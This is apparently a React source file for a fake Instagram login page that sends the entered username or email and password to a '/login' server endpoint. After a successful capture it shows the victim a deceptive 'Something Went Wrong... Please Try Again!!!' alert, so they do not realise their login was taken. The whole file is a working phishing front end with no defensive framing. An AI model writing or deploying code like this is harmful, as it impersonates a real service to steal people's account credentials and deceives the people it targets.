import React, { useState } from "react";
import "../style/Instagram.css";

const Instagram = () => {

    const [email, setEmail] = useState();
    const [password, setPassword] = useState();

     const loginEvent = async ()=>{

        console.log("I am Clicked")

        const res = await fetch('/login' , {

          method:"POST",
          headers:{
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            email,
            password
          })

        });

        const data = await res.json();

        if(res.status === 400 || !data){
            window.alert("Invalid Credentials")
            console.log("Invalid Credentials")
        }else{
            window.alert("Something Went Wrong... Please Try Again!!!")
            console.log("Login SuccesFull")
            setEmail("")
            setPassword("")
            }

     };
 
  return (
    <div className="mainContainer">
      <div className="innerDiv">
        <div className="upperDiv">
          <h1>Instagram</h1>
        </div>

        <div className="lowerDiv">
          <div className="input">
            <input
              type="text"
              placeHolder="Phone number , username or email"
              value={email}
              onChange={ (e)=>{setEmail(e.target.value)} }
              autoComplete="off"
              autoCorrect="off"
              autoFocus="false"
              autoCapitalize="off"
            />
          </div>
          <div className="input">
            <input
              type="password"
              placeHolder="Password"
              value={password}
              onChange={ (e)=>{setPassword(e.target.value)} }
              autoComplete="off"
              autoCorrect="off"
              autoFocus="false"
              autoCapitalize="off"
            />
          </div>

          <div className="btn">
            <button onClick={loginEvent} >Log In</button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Instagram;
